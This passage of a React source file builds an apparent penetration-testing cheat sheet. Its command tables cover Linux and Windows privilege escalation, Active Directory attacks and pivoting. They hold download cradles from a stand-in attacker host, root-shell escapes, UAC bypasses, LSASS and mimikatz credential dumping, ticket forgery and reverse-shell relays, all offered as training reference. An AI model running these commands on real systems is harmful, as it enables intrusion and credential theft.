import { useState, useMemo } from 'react';
import { Search } from 'lucide-react';
import { Card } from '../components/ui/Card.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { Input } from '../components/ui/Input.jsx';
import { Tabs } from '../components/ui/Tabs.jsx';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';
import { VariableBar } from '../components/ui/VariableBar.jsx';
import { useVariables } from '../lib/variables.js';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const tabs = [
  { value: 'linux', label: 'Linux' },
  { value: 'windows', label: 'Windows' },
  { value: 'ad', label: 'AD' },
  { value: 'pivot', label: 'Pivot' },
  { value: 'transfer', label: 'Transfer' },
  { value: 'nmap', label: 'Nmap' },
  { value: 'metasploit', label: 'Metasploit' },
  { value: 'web', label: 'Web' },
];

// ─── LINUX ──────────────────────────────────────────
const linuxData = {
  'File System': [
    { cmd: 'ls -la', desc: 'List all files including hidden, long format', example: 'ls -la /etc/' },
    { cmd: 'cd', desc: 'Change directory', example: 'cd /var/www/html' },
    { cmd: 'cp -r', desc: 'Copy files/directories recursively', example: 'cp -r /source /destination' },
    { cmd: 'mv', desc: 'Move or rename files', example: 'mv oldname.txt newname.txt' },
    { cmd: 'rm -rf', desc: 'Remove files/directories recursively and forcefully', example: 'rm -rf /tmp/trash/' },
    { cmd: 'find / -name', desc: 'Search for files by name from root', example: 'find / -name "*.conf" -type f 2>/dev/null' },
    { cmd: 'find / -perm -4000', desc: 'Find SUID binaries (privesc vector)', example: 'find / -perm -4000 -type f 2>/dev/null' },
    { cmd: 'locate', desc: 'Fast file search using database', example: 'locate password.txt && sudo updatedb' },
    { cmd: 'chmod', desc: 'Change file permissions', example: 'chmod 755 script.sh && chmod u+s binary' },
    { cmd: 'chown', desc: 'Change file owner and group', example: 'chown root:root /etc/shadow' },
    { cmd: 'ln -s', desc: 'Create symbolic link', example: 'ln -s /usr/bin/python3 /usr/bin/python' },
    { cmd: 'stat', desc: 'Inode, owner, capabilities metadata', example: 'stat /usr/bin/sudo' },
    { cmd: 'mount', desc: 'List mounts — nosuid, NFS, bind mounts', example: 'mount | column -t' },
    { cmd: 'df -h', desc: 'Disk space — find writable mount points', example: 'df -h /tmp /dev/shm' },
  ],
  'Networking': [
    { cmd: 'ifconfig / ip a', desc: 'Show network interfaces and IP addresses', example: 'ip a show eth0' },
    { cmd: 'netstat -tulnp', desc: 'Show listening ports with process info', example: 'netstat -tulnp | grep :80' },
    { cmd: 'ss -tulnp', desc: 'Modern socket statistics (replaces netstat)', example: 'ss -tulnp | grep LISTEN' },
    { cmd: 'curl', desc: 'Transfer data from/to server', example: 'curl -X POST -d "user=admin&pass=admin" http://target/login' },
    { cmd: 'wget', desc: 'Download files from the web', example: 'wget http://attacker/linpeas.sh -O /tmp/linpeas.sh' },
    { cmd: 'ping', desc: 'Test network connectivity via ICMP', example: 'ping -c 4 10.10.10.1' },
    { cmd: 'traceroute', desc: 'Trace packet route to destination', example: 'traceroute 10.10.10.1' },
    { cmd: 'dig', desc: 'DNS lookup utility', example: 'dig axfr @ns1.target.com target.com' },
    { cmd: 'nslookup', desc: 'Query DNS records', example: 'nslookup -type=any target.com' },
    { cmd: 'arp -a', desc: 'Show ARP table (hosts on local network)', example: 'arp -a | grep -v incomplete' },
    { cmd: 'route -n', desc: 'Show kernel routing table', example: 'route -n' },
    { cmd: 'nc -zv', desc: 'Quick TCP port check from host', example: 'nc -zv 127.0.0.1 3306' },
    { cmd: 'tcpdump', desc: 'Capture traffic (needs caps/root)', example: 'sudo tcpdump -i any -n host 10.10.10.5' },
  ],
  'Process Management': [
    { cmd: 'ps aux', desc: 'List all running processes', example: 'ps aux | grep root' },
    { cmd: 'top / htop', desc: 'Interactive process viewer', example: 'top -u www-data' },
    { cmd: 'kill -9', desc: 'Force kill a process by PID', example: 'kill -9 $(pidof apache2)' },
    { cmd: 'bg', desc: 'Resume suspended job in background', example: 'bg %1' },
    { cmd: 'fg', desc: 'Bring background job to foreground', example: 'fg %1' },
    { cmd: 'jobs', desc: 'List active jobs in current shell', example: 'jobs -l' },
    { cmd: 'nohup', desc: 'Run command immune to hangups', example: 'nohup ./long_scan.sh &' },
    { cmd: 'command &', desc: 'Run command in background', example: 'python3 -m http.server 8080 &' },
    { cmd: 'strace -p', desc: 'Trace syscalls of a process (spot file reads, creds)', example: 'strace -p $(pidof mysqld) 2>&1 | grep -i pass' },
    { cmd: 'lsof -i', desc: 'List open network files per process', example: 'lsof -i -P -n | grep LISTEN' },
  ],
  'Users & Permissions': [
    { cmd: 'whoami', desc: 'Print current username', example: 'whoami' },
    { cmd: 'id', desc: 'Print user ID, group ID, and groups', example: 'id' },
    { cmd: 'su', desc: 'Switch user', example: 'su - root' },
    { cmd: 'sudo -l', desc: 'List allowed sudo commands for current user', example: 'sudo -l' },
    { cmd: 'passwd', desc: 'Change user password', example: 'passwd username' },
    { cmd: 'adduser', desc: 'Add a new user', example: 'adduser hacker && usermod -aG sudo hacker' },
    { cmd: 'groups', desc: 'Show groups a user belongs to', example: 'groups www-data' },
    { cmd: 'cat /etc/passwd', desc: 'View user accounts (check for shells)', example: 'cat /etc/passwd | grep -v nologin | grep -v false' },
    { cmd: 'cat /etc/shadow', desc: 'View password hashes (requires root)', example: 'cat /etc/shadow | grep "\\$"' },
    { cmd: 'getent passwd', desc: 'Enumerate passwd via NSS (LDAP/NIS aware)', example: 'getent passwd' },
    { cmd: 'lastlog', desc: 'Last login times for all users', example: 'lastlog | grep -v "Never"' },
  ],
  'Archives': [
    { cmd: 'tar -czvf', desc: 'Create gzipped tar archive', example: 'tar -czvf backup.tar.gz /var/www/' },
    { cmd: 'tar -xzvf', desc: 'Extract gzipped tar archive', example: 'tar -xzvf backup.tar.gz -C /tmp/' },
    { cmd: 'gzip / gunzip', desc: 'Compress/decompress files', example: 'gzip file.txt && gunzip file.txt.gz' },
    { cmd: 'unzip', desc: 'Extract ZIP archives', example: 'unzip archive.zip -d /output/' },
    { cmd: '7z x', desc: 'Extract 7-Zip archives', example: '7z x archive.7z' },
    { cmd: 'zip -r', desc: 'Create zip recursively (exfil / staging)', example: 'zip -r loot.zip /var/www/html/*.php' },
  ],
  'Text Processing': [
    { cmd: 'grep -r', desc: 'Search text recursively in files', example: 'grep -ri "password" /var/www/ --include="*.php"' },
    { cmd: 'awk', desc: 'Pattern scanning and processing', example: "awk -F: '{print $1, $3}' /etc/passwd" },
    { cmd: 'sed', desc: 'Stream editor for text transformation', example: "sed -i 's/old/new/g' file.txt" },
    { cmd: 'cut', desc: 'Cut sections from each line', example: "cut -d':' -f1 /etc/passwd" },
    { cmd: 'sort', desc: 'Sort lines of text', example: 'sort -u wordlist.txt' },
    { cmd: 'uniq', desc: 'Report or omit repeated lines', example: 'sort file.txt | uniq -c | sort -rn' },
    { cmd: 'wc', desc: 'Count lines, words, and bytes', example: 'wc -l /usr/share/wordlists/rockyou.txt' },
    { cmd: 'head / tail', desc: 'Output first/last part of files', example: 'tail -f /var/log/auth.log' },
    { cmd: 'tr', desc: 'Translate or delete characters', example: "echo 'HELLO' | tr 'A-Z' 'a-z'" },
    { cmd: 'xargs', desc: 'Build commands from stdin (batch exploitation)', example: 'cat hosts.txt | xargs -I{} ping -c1 {}' },
  ],
  'Linux PrivEsc': [
    { cmd: 'find SUID', desc: 'Enumerate SUID binaries (GTFOBins)', example: 'find / -perm -4000 -type f 2>/dev/null' },
    { cmd: 'find SGID', desc: 'Enumerate SGID binaries', example: 'find / -perm -2000 -type f 2>/dev/null' },
    { cmd: '/usr/bin/find -exec', desc: 'SUID find — spawn shell (if SUID)', example: '/usr/bin/find . -exec /bin/sh -p \\; -quit' },
    { cmd: 'vim —privesc', desc: 'SUID vim — escape to root shell', example: 'vim -c \':!/bin/sh\'' },
    { cmd: 'nano —privesc', desc: 'Misconfigured editor with root file', example: 'sudo nano /etc/shadow' },
    { cmd: 'getcap -r', desc: 'Recursive Linux capabilities on files', example: 'getcap -r / 2>/dev/null' },
    { cmd: 'capsh —check', desc: 'Inspect current capability set', example: 'capsh --print' },
    { cmd: 'python cap_setuid', desc: 'cap_setuid+ep on python — drop root shell', example: './python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'' },
    { cmd: 'perl cap_setuid', desc: 'cap_setuid on perl', example: 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";\'' },
    { cmd: 'crontab -l', desc: 'Current user cron jobs', example: 'crontab -l' },
    { cmd: '/etc/crontab', desc: 'System-wide cron definitions', example: 'cat /etc/crontab' },
    { cmd: 'cron.d', desc: 'Drop-in cron snippets', example: 'ls -la /etc/cron.d/ && cat /etc/cron.d/*' },
    { cmd: 'systemd timers', desc: 'Timer units (often overlooked persistence/privesc)', example: 'systemctl list-timers --all' },
    { cmd: 'writable /etc/cron*', desc: 'World-writable cron paths', example: 'find /etc/cron* -writable 2>/dev/null' },
    { cmd: 'writable PATH dirs', desc: 'Dirs in PATH where you can write', example: 'echo $PATH | tr \':\' \'\\n\' | xargs -I{} sh -c \'[ -w "{}" ] && echo writable: {}\'' },
    { cmd: 'writable systemd unit', desc: 'Writable service unit files', example: 'find /etc/systemd/system -writable 2>/dev/null' },
    { cmd: 'ldconfig -p', desc: 'Print shared library cache / hijack targets', example: 'ldconfig -p | grep -i custom' },
    { cmd: 'LD_PRELOAD + sudo', desc: 'If env_keep includes LD_PRELOAD', example: 'sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2' },
    { cmd: 'ld.so.preload', desc: 'Global LD_PRELOAD file (root)', example: 'cat /etc/ld.so.preload' },
    { cmd: 'PYTHONPATH hijack', desc: 'Prepend malicious site-packages', example: 'export PYTHONPATH=/tmp:$PYTHONPATH && python3 /opt/app/main.py' },
    { cmd: 'RPATH RUNPATH', desc: 'Find binaries with weak RPATH', example: 'readelf -d /path/binary | grep -E \'RPATH|RUNPATH\'' },
    { cmd: 'wildcard cron tar', desc: 'Tar wildcard abuse via cron', example: '# attacker: echo "chmod +s /bin/bash" > --checkpoint-action=exec=sh shell.sh' },
    { cmd: 'chown —wildcard', desc: 'Cron wildcard + chown root payload', example: '# see GTFOBins / wildcard injection patterns' },
    { cmd: 'sudo -l', desc: 'List sudoers rules for current user', example: 'sudo -l' },
    { cmd: 'sudo LD_PRELOAD', desc: 'sudo ALL + SETENV may allow preload', example: 'sudo LD_PRELOAD=/tmp/x.so ALL' },
    { cmd: 'sudo -u#-1', desc: 'CVE-2019-14287 sudo user ID -1 bypass (legacy)', example: 'sudo -u#-1 /bin/bash' },
    { cmd: 'sudo CVE-2021-3156', desc: 'Baron Samedit — check patched sudo', example: 'sudoedit -s \'\\\' $(python3 exploit.py)' },
    { cmd: 'pkexec polkit', desc: 'Polkit auth dialog abuse (versions)', example: 'pkexec /bin/bash' },
    { cmd: 'docker.sock', desc: 'Access to docker socket = host escape', example: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh' },
    { cmd: 'docker group', desc: 'User in docker group → root on host', example: 'docker run --rm -it -v /:/host ubuntu chroot /host bash' },
    { cmd: 'lxc/lxd', desc: 'LXD group may mount host filesystem', example: 'lxc image import alpine.tar.gz --alias a && lxc init a c -c security.privileged=true' },
    { cmd: 'kernel exploit search', desc: 'Match kernel to public exploits', example: 'uname -a && searchsploit "linux kernel $(uname -r | cut -d- -f1)"' },
    { cmd: 'dirty pipe / cve grep', desc: 'Check kernel for known LPE CVEs', example: 'grep -E "DirtyPipe|Overlayfs" /proc/version || true' },
    { cmd: 'NFS no_root_squash', desc: 'Export misconfig — write SUID as root', example: 'showmount -e target && mkdir /tmp/nfs; mount -t nfs target:/export /tmp/nfs' },
    { cmd: 'MOTD pam_motd', desc: 'Writable MOTD scripts run as root on login', example: 'ls -la /etc/update-motd.d/' },
    { cmd: 'udev rules writable', desc: 'Malicious udev rules for root', example: 'find /etc/udev/rules.d -writable 2>/dev/null' },
    { cmd: '/etc/passwd writable', desc: 'Add root-equivalent user', example: 'echo "hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash" >> /etc/passwd' },
    { cmd: 'screen privilege', desc: 'Exploitable screen versions (SUID)', example: 'find / -name screen -perm -4000 2>/dev/null' },
    { cmd: 'service unit hijack', desc: 'Replace binary referenced by weak service', example: 'grep ExecStart /etc/systemd/system/*.service' },
    { cmd: 'polkit pkexec', desc: 'Check polkit rules for excessive rights', example: 'ls -la /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/' },
    { cmd: 'dbus-send abuse', desc: 'Enumerate activatable systemd services via D-Bus', example: 'dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListActivatableNames' },
    { cmd: 'writable /opt scripts', desc: 'Startup scripts in /opt or profile.d', example: 'find /etc/profile.d /opt -writable -type f 2>/dev/null' },
    { cmd: 'init.d hijack', desc: 'Writable SysV init scripts', example: 'find /etc/init.d -writable 2>/dev/null' },
  ],
};

// ─── WINDOWS ────────────────────────────────────────
const windowsData = {
  'System Info': [
    { cmd: 'systeminfo', desc: 'Detailed OS and hardware info', example: 'systeminfo | findstr /B /C:"OS"' },
    { cmd: 'hostname', desc: 'Display computer name', example: 'hostname' },
    { cmd: 'whoami /all', desc: 'Current user, SIDs, privileges, groups', example: 'whoami /priv' },
    { cmd: 'ipconfig /all', desc: 'Network adapter configuration', example: 'ipconfig /all | findstr "IPv4"' },
    { cmd: 'net user', desc: 'List local user accounts', example: 'net user administrator' },
    { cmd: 'net localgroup', desc: 'List local groups and members', example: 'net localgroup administrators' },
    { cmd: 'tasklist', desc: 'List running processes', example: 'tasklist /SVC | findstr /i "sql"' },
    { cmd: 'taskkill /F /PID', desc: 'Force kill process by PID', example: 'taskkill /F /PID 1234' },
    { cmd: 'wmic', desc: 'WMI command-line interface', example: 'wmic qfe list brief' },
    { cmd: 'sc query', desc: 'Query service status', example: 'sc query state=all | findstr "SERVICE_NAME"' },
    { cmd: 'systeminfo | findstr', desc: 'Hotfix / build for exploit matching', example: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"' },
    { cmd: 'wmic product', desc: 'Installed software enumeration', example: 'wmic product get name,version' },
  ],
  'File Operations': [
    { cmd: 'dir /s /b', desc: 'List files recursively, bare format', example: 'dir /s /b C:\\Users\\*.txt' },
    { cmd: 'copy', desc: 'Copy files', example: 'copy C:\\SAM C:\\temp\\SAM' },
    { cmd: 'move', desc: 'Move files', example: 'move file.txt C:\\temp\\' },
    { cmd: 'del /f', desc: 'Force delete files', example: 'del /f /q C:\\temp\\*.log' },
    { cmd: 'type', desc: 'Display file contents', example: 'type C:\\Users\\admin\\Desktop\\flag.txt' },
    { cmd: 'icacls', desc: 'Display/modify file permissions (ACLs)', example: 'icacls C:\\Windows\\System32\\config\\SAM' },
    { cmd: 'attrib', desc: 'Display/change file attributes', example: 'attrib +h +s secret.txt' },
    { cmd: 'tree', desc: 'Display directory tree', example: 'tree /f C:\\Users\\' },
    { cmd: 'where /R', desc: 'Locate executables recursively', example: 'where /R C:\\ *.exe | findstr /i "password"' },
    { cmd: 'findstr /S /I', desc: 'Grep-like secret hunting on Windows', example: 'findstr /S /I /M "password" C:\\Users\\*.txt' },
  ],
  'Network': [
    { cmd: 'netstat -ano', desc: 'Show connections with PIDs', example: 'netstat -ano | findstr "LISTENING"' },
    { cmd: 'arp -a', desc: 'Display ARP table', example: 'arp -a' },
    { cmd: 'nslookup', desc: 'DNS query tool', example: 'nslookup target.com' },
    { cmd: 'ping', desc: 'Test connectivity', example: 'ping -n 4 10.10.10.1' },
    { cmd: 'tracert', desc: 'Trace route to host', example: 'tracert 10.10.10.1' },
    { cmd: 'route print', desc: 'Display routing table', example: 'route print' },
    { cmd: 'netsh', desc: 'Network config utility', example: 'netsh advfirewall show allprofiles' },
    { cmd: 'netsh wlan show profiles', desc: 'Show saved WiFi profiles', example: 'netsh wlan show profile name="WiFi" key=clear' },
    { cmd: 'net share', desc: 'Show network shares', example: 'net share' },
    { cmd: 'net use', desc: 'Map network drives / connect to shares', example: 'net use \\\\target\\C$ /user:admin password123' },
    { cmd: 'netstat -anob', desc: 'Connections with owning binary (admin)', example: 'netstat -ano | findstr LISTENING' },
  ],
  'PowerShell': [
    { cmd: 'Get-Process', desc: 'List running processes', example: 'Get-Process | Where-Object {$_.CPU -gt 100}' },
    { cmd: 'Get-Service', desc: 'List services and their status', example: 'Get-Service | Where-Object {$_.Status -eq "Running"}' },
    { cmd: 'Get-NetTCPConnection', desc: 'Show TCP connections (netstat replacement)', example: 'Get-NetTCPConnection -State Listen' },
    { cmd: 'Get-ChildItem -Recurse', desc: 'Recursive file listing', example: 'Get-ChildItem -Path C:\\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue' },
    { cmd: 'Invoke-WebRequest', desc: 'HTTP requests (wget/curl equivalent)', example: 'Invoke-WebRequest -Uri http://attacker/shell.exe -OutFile C:\\temp\\shell.exe' },
    { cmd: 'Set-ExecutionPolicy', desc: 'Change PowerShell script execution policy', example: 'Set-ExecutionPolicy Bypass -Scope Process' },
    { cmd: 'Get-Acl', desc: 'Get file/directory permissions', example: 'Get-Acl C:\\Users\\admin | Format-List' },
    { cmd: 'Get-WmiObject', desc: 'Query WMI (system info, patches, etc.)', example: 'Get-WmiObject -Class Win32_OperatingSystem' },
    { cmd: 'Invoke-Expression (IEX)', desc: 'Execute string as command (download cradle)', example: "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')" },
    { cmd: 'Get-LocalUser', desc: 'List local user accounts', example: 'Get-LocalUser | Select Name, Enabled, LastLogon' },
    { cmd: 'Get-ComputerInfo', desc: 'OS, hotfix, hypervisor summary', example: 'Get-ComputerInfo | Select WindowsProductName, OsArchitecture, OsHotFixes' },
    { cmd: 'Select-String', desc: 'Search files for patterns (creds, keys)', example: 'Get-ChildItem C:\\Users -Recurse -Include *.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern "password"' },
  ],
  'Windows PrivEsc': [
    { cmd: 'whoami /priv', desc: 'List privileges — SeImpersonate / SeBackup / SeDebug', example: 'whoami /priv' },
    { cmd: 'whoami /groups', desc: 'Group memberships and integrity level', example: 'whoami /groups' },
    { cmd: 'PrintSpoofer', desc: 'Abuse SeImpersonate via named pipe printer (local)', example: 'PrintSpoofer.exe -i -c cmd' },
    { cmd: 'JuicyPotato', desc: 'Legacy DCOM-based token steal (old builds)', example: 'JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami" -t *' },
    { cmd: 'RoguePotato', desc: 'Modern alternative to JuicyPotato', example: 'RoguePotato.exe -r 10.10.14.5 -e "C:\\Windows\\System32\\cmd.exe" -l 9999' },
    { cmd: 'GodPotato', desc: 'Token abuse on newer Windows (SeImpersonate)', example: 'GodPotato.exe -cmd "cmd /c whoami"' },
    { cmd: 'sc qc', desc: 'Query service config — BINARY_PATH_NAME, permissions', example: 'sc qc "VulnerableService"' },
    { cmd: 'accesschk (Sysinternals)', desc: 'Service / folder weak DACLs', example: 'accesschk.exe -uwcqv "Everyone" *' },
    { cmd: 'icacls weak service', desc: 'Writable service binary path', example: 'icacls "C:\\Program Files\\VulnApp\\service.exe"' },
    { cmd: 'unquoted service path', desc: 'Space in path without quotes — DLL hijack order', example: 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\"' },
    { cmd: 'DLL search order hijack', desc: 'Drop malicious DLL in writable search path', example: 'procmon → filter PATH NOT FOUND for service.exe' },
    { cmd: 'reg query Image File Exec', desc: 'IFEO debugger hijack (needs admin to set)', example: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"' },
    { cmd: 'AlwaysInstallElevated', desc: 'MSI runs as SYSTEM if both keys set', example: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
    { cmd: 'reg query AlwaysInstallElevated HKLM', desc: 'Machine policy half of MSI privesc', example: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' },
    { cmd: 'cmdkey /list', desc: 'List stored credentials (runas / saved)', example: 'cmdkey /list' },
    { cmd: 'runas /savecred', desc: 'Execute with saved creds if present', example: 'runas /savecred /user:DOMAIN\\admin "cmd.exe"' },
    { cmd: 'schtasks /query', desc: 'Enumerate scheduled tasks', example: 'schtasks /query /fo LIST /v' },
    { cmd: 'schtasks misconfig', desc: 'Task runs as SYSTEM with writable binary', example: 'schtasks /query /tn "\\Microsoft\\Windows\\SomeTask" /v /fo LIST' },
    { cmd: 'reg query Run', desc: 'Current user autorun persistence', example: 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' },
    { cmd: 'reg query RunOnce', desc: 'RunOnce keys', example: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' },
    { cmd: 'reg query Winlogon', desc: 'Userinit / shell hijack vectors', example: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"' },
    { cmd: 'UAC fodhelper', desc: 'UAC bypass via fodhelper (example technique)', example: 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f && fodhelper.exe' },
    { cmd: 'UAC eventvwr', desc: 'HKCU hijack + eventvwr mmc (legacy)', example: 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe" /f' },
    { cmd: 'token::elevate (mimikatz)', desc: 'Mimikatz privilege/token abuse', example: 'mimikatz # privilege::debug # token::elevate' },
    { cmd: 'sekurlsa::logonpasswords', desc: 'Dump creds from LSASS (admin)', example: 'mimikatz # privilege::debug # sekurlsa::logonpasswords' },
    { cmd: 'lsass dump taskmgr', desc: 'Create dump for offline mimikatz', example: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\ls.dmp full' },
    { cmd: 'Get-UnquotedService', desc: 'PowerShell find unquoted paths', example: 'Get-CimInstance Win32_Service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch \'^"\' } | Select Name, PathName' },
    { cmd: 'Get-ModifiableServiceFile', desc: 'PowerUp-style weak service files', example: 'IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.14.5/PowerUp.ps1\'); Invoke-AllChecks' },
    { cmd: 'Get-ChildItem VSS', desc: 'Shadow copy / SAM access ideas', example: 'wmic shadowcopy call create Volume=C:\\' },
    { cmd: 'icacls backup operators', desc: 'SeBackupPrivilege — copy SAM/SYSTEM', example: 'whoami /priv | findstr Backup' },
    { cmd: 'WSReset UAC bypass', desc: 'Store/method abuse (version dependent)', example: 'Research WSReset.exe UAC bypass for your build' },
    { cmd: 'SeAssignPrimaryToken', desc: 'Create process as another user if enabled', example: 'whoami /priv | findstr PrimaryToken' },
    { cmd: 'meterpreter getsystem', desc: 'MSF token techniques', example: 'getsystem -t 0  # or 1,2,3,4' },
    { cmd: 'SharpUp / WinPEAS', desc: 'Automated Windows privesc enum', example: 'WinPEASx64.exe quiet cmd' },
  ],
};

// ─── ACTIVE DIRECTORY ───────────────────────────────
const adData = {
  'Active Directory': [
    { cmd: 'neo4j console', desc: 'Start BloodHound graph DB locally', example: 'neo4j console  # then http://localhost:7474' },
    { cmd: 'BloodHound CE / legacy', desc: 'Ingest SharpHound → analyze attack paths', example: 'Open BloodHound → Upload zip from SharpHound' },
    { cmd: 'SharpHound.exe', desc: 'Collect AD data for BloodHound (Windows)', example: 'SharpHound.exe -c All --zipfilename loot.zip' },
    { cmd: 'bloodhound-python', desc: 'Linux collector using LDAP + bloodhound', example: 'bloodhound-python -u user -p pass -d domain.local -gc dc.domain.local -c all -ns 10.10.10.10' },
    { cmd: 'Rubeus kerberoast', desc: 'Request RC4 TGS for SPN users', example: 'Rubeus.exe kerberoast /outfile:hashes.txt' },
    { cmd: 'Rubeus asreproast', desc: 'AS-REP for accounts without pre-auth', example: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt' },
    { cmd: 'Rubeus monitor', desc: 'Monitor for new TGT/TGS (pass-the-ticket)', example: 'Rubeus.exe monitor /interval:5' },
    { cmd: 'Rubeus renew', desc: 'Renew a TGT', example: 'Rubeus.exe renew /ticket:doIF...' },
    { cmd: 'GetNPUsers.py', desc: 'Impacket AS-REP roast from Linux', example: 'impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash' },
    { cmd: 'GetUserSPNs.py', desc: 'Impacket Kerberoast from Linux', example: 'impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request' },
    { cmd: 'secretsdump.py', desc: 'DCSync / remote SAM/NTDS dump', example: 'impacket-secretsdump domain/admin@dc.domain.local -just-dc-ntlm' },
    { cmd: 'secretsdump local', desc: 'SAM/SYSTEM/SECURITY from files', example: 'impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL' },
    { cmd: 'psexec.py', desc: 'Remote semi-interactive shell via SMB', example: 'impacket-psexec domain/user:pass@10.10.10.10' },
    { cmd: 'smbexec.py', desc: 'Stealthier command exec over SMB', example: 'impacket-smbexec domain/user:pass@10.10.10.10' },
    { cmd: 'wmiexec.py', desc: 'Exec via WMI (port 135)', example: 'impacket-wmiexec domain/user:pass@10.10.10.10' },
    { cmd: 'atexec.py', desc: 'Task Scheduler remote command', example: 'impacket-atexec domain/user:pass@10.10.10.10 "whoami"' },
    { cmd: 'dcomexec.py', desc: 'Execute via DCOM MMC Application', example: 'impacket-dcomexec domain/user:pass@10.10.10.10' },
    { cmd: 'ticketer.py Golden', desc: 'Forge Golden Ticket (krbtgt hash)', example: 'impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... -domain domain.local eviluser' },
    { cmd: 'ticketer.py Silver', desc: 'Forge service ticket for target SPN', example: 'impacket-ticketer -nthash <machine_ntlm> -spn cifs/dc.domain.local -domain domain.local user' },
    { cmd: 'mimikatz Golden Ticket', desc: 'Forge TGT in memory', example: 'kerberos::golden /user:evil /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt' },
    { cmd: 'mimikatz DCSync', desc: 'Replicate secrets (rights needed)', example: 'lsadump::dcsync /domain:domain.local /user:krbtgt' },
    { cmd: 'Pass-the-Hash psexec', desc: 'Authenticate with NTLM hash only', example: 'impacket-psexec -hashes :NTLMHASH domain/user@10.10.10.10' },
    { cmd: 'export KRB5CCNAME', desc: 'Use ccache after pass-the-ticket', example: 'export KRB5CCNAME=/tmp/evil.ccache && impacket-psexec -k -no-pass domain/user@host' },
    { cmd: 'ldapsearch', desc: 'Raw LDAP enumeration', example: 'ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName' },
    { cmd: 'windapsearch', desc: 'AD LDAP wrapper for users/groups/computers', example: 'windapsearch -u domain\\\\user -p pass --dc 10.10.10.10 -U' },
    { cmd: 'certipy find', desc: 'Enumerate AD CS templates & misconfigs', example: 'certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10' },
    { cmd: 'certipy req', desc: 'Request certificate (ESC1/ESC8 scenarios)', example: 'certipy req -u user@domain.local -p pass -ca CORP-CA -template User' },
    { cmd: 'certipy auth', desc: 'Authenticate with pfx / certificate', example: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10' },
    { cmd: 'rpcclient enumdomusers', desc: 'Quick user enum via RPC', example: 'rpcclient -U "domain/user%pass" 10.10.10.10 -c enumdomusers' },
    { cmd: 'crackmapexec smb', desc: 'Spray / exec / share enum', example: 'crackmapexec smb 10.10.10.0/24 -u user -p pass --shares' },
    { cmd: 'enum4linux-ng', desc: 'SMB/RID/users enumeration', example: 'enum4linux-ng -A 10.10.10.10 -u user -p pass' },
  ],
};

// ─── PIVOTING & TUNNELING ───────────────────────────
const pivotData = {
  'Pivoting & Tunneling': [
    { cmd: 'ssh -L local forward', desc: 'Forward local port to remote host:port', example: 'ssh -L 8080:10.0.0.5:80 user@jump -N' },
    { cmd: 'ssh -R reverse forward', desc: 'Expose attacker port via remote SSH server', example: 'ssh -R 9090:127.0.0.1:445 user@jump -N' },
    { cmd: 'ssh -D SOCKS', desc: 'Dynamic SOCKS proxy on local port', example: 'ssh -D 1080 user@jump -N' },
    { cmd: 'ssh -J ProxyJump', desc: 'Chain jumps through bastion', example: 'ssh -J user@bastion user@internal.host' },
    { cmd: 'ssh -W tunnel', desc: 'Stdio tunnel to host:port (ProxyCommand)', example: 'ssh -W %h:%p user@jump' },
    { cmd: 'chisel server', desc: 'Reverse SOCKS / port forward server', example: './chisel server -p 8000 --reverse' },
    { cmd: 'chisel client reverse', desc: 'Client connects out; expose R:socks', example: './chisel client http://10.10.14.5:8000 R:socks' },
    { cmd: 'chisel forward', desc: 'Remote port forward via chisel', example: './chisel client http://10.10.14.5:8000 R:3389:10.0.0.5:3389' },
    { cmd: 'ligolo-ng proxy', desc: 'TUN-based pivot (agent → proxy)', example: './proxy -selfcert' },
    { cmd: 'ligolo-ng agent', desc: 'Run agent on compromised host', example: './agent -connect 10.10.14.5:11601 -ignore-cert' },
    { cmd: 'socat TCP relay', desc: 'Bidirectional TCP relay', example: 'socat TCP-LISTEN:4444,fork TCP:10.0.0.5:80' },
    { cmd: 'socat TTY reverse', desc: 'Full TTY reverse shell relay', example: 'socat file:`tty`,raw,echo=0 TCP-LISTEN:4444' },
    { cmd: 'proxychains', desc: 'Force tools through SOCKS proxy', example: 'proxychains4 nmap -sT -Pn 10.0.0.0/24' },
    { cmd: 'proxychains.conf', desc: 'Point to local SSH/chisel SOCKS', example: 'socks5 127.0.0.1 1080' },
